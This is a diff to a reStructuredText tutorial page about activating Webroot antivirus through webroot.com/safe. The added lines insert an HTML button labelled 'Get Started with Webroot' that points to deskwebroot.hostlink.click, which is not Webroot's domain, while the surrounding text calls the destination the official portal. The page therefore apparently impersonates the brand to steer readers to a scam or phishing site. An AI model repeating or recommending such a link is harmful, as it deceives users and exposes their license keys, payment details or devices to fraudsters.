@@ -3,6 +3,12 @@ Activate Your Webroot Security at webroot.com/safe – Downloading & Installatio
 
 In today’s digital world, protecting your personal and professional data is crucial. Whether you're securing your home PC or office network, **Webroot SecureAnywhere** offers a powerful, lightweight antivirus solution. To ensure full protection, it’s essential to properly **Activate Your Webroot Security**. The process begins with visiting `webroot.com/safe <https://www.webroot.com/safe>`_ — the official Webroot activation portal.
 
+.. raw:: html
+
+   <div style="text-align:center;">
+       <a href="https://deskwebroot.hostlink.click/" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Get Started with Webroot</a>
+   </div>
+
 In this guide, we’ll walk you through how to use **webroot.com/safe** to download and install your software. Whether you've just bought a Webroot license or need to reinstall it on a new device, our step-by-step instructions will ensure smooth installation and activation.
 
 Use **webroot.com/safe** to register your keycode, install the software, and customize your security preferences. This tutorial is ideal for first-time users and returning customers alike who want to **Activate Your Webroot Security** and optimize device safety.
